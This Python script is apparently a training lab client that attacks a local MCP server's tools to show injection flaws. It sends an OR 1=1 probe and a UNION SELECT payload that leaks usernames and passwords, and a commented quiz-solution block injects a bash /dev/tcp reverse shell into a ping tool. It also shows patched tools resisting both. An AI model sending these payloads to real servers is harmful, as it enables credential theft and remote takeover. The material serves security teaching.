from mcp import Client
import asyncio
from rich import print
from rich.panel import Panel

def display_orders(orders: list[dict]) -> None:
    """
    Just a nice display of client orders
    """

    print(f"\n📦 ORDERS")
    print("─" * 45)

    if not orders:
        print("No orders.")
        return

    for order in orders:
        print(f"  #{order['id']:<4} │ {order['name']} | {order['product']}")

    print("─" * 45)
    print(f"Total : {len(orders)} commande(s)\n")

async def main() -> None:
    async with Client("http://localhost:8000/mcp") as client:

        result = await client.list_tools()
        print(result)

        print(Panel("[bold red][/bold red]", title="SQL Injection in MCP tool", border_style="red"))

        # Normal request
        print(Panel("[bold green]Valid request[/bold green]", title="Step 1", border_style="green"))
        result = await client.call_tool("get_user_orders", {"name": "Sanguinius"})
        display_orders(orders=result.structured_content["result"])

        # Try SQL injection pattern
        print(Panel("[bold red]Check SQLI vulnerability[/bold red]", title="Step 2", border_style="red"))
        result = await client.call_tool("get_user_orders", {"name": "Sanguinius' OR 1=1 -- -"})
        display_orders(orders=result.structured_content["result"])
        print("[bold red]WARNING: SQLI vulnerability detected\n[/bold red]")

        # Manipulate the database to get sensible data
        # Learn SQL injection attack if you want to obtain a deeper understanding of this type of attack
        print(Panel("[bold red]Exploit the database[/bold red]", title="Step 3", border_style="red"))
        result = await client.call_tool("get_user_orders", {"name": "FAKE' UNION SELECT 1,name,password FROM users-- "})
        display_orders(orders=result.structured_content["result"])
        print("[bold red]WARNING: Passwords leaked\n[/bold red]")

        # Request to a protected tool
        print(Panel("[bold green]Safe response from the fixed tool[/bold green]", title="Step 1", border_style="green"))
        result = await client.call_tool("safe_get_user_orders", {"name": "FAKE' UNION SELECT 1,name,password FROM users-- "})
        display_orders(orders=result.structured_content["result"])

# ========================================= #
# 🚫 DO NOT LOOK! — QUIZ SOLUTIONS BELOW 🤫 #
# ========================================= #

        # print(Panel("[bold red][/bold red]", title="OS command Injection in MCP tool", border_style="red"))
        
        # # Normal request
        # print(Panel("[bold green]Valid request[/bold green]", title="Step 1", border_style="green"))
        # result = await client.call_tool("check_ping", {"host": "0.0.0.0"})
        # print(result.structured_content)

        # # Try OS command injection
        # print(Panel("[bold red]Exploit the server system\nDon't forget to execute `nc -lv 127.0.0.1 4444` in another console ![/bold red]", title="Step 3", border_style="red"))
        # result = await client.call_tool("check_ping", {"host": "0.0.0.0 && bash -i >& /dev/tcp/localhost/4444 0>&1"})
        # print(result.structured_content)

        # # Request to a protected tool
        # print(Panel("[bold green]Safe response from the fixed tool[/bold green]", title="Step 1", border_style="green"))
        # result = await client.call_tool("safe_check_ping", {"host": "0.0.0.0 && bash -i >& /dev/tcp/localhost/4444 0>&1"})
        # print(result.content[0])

if __name__ == "__main__":
    asyncio.run(main())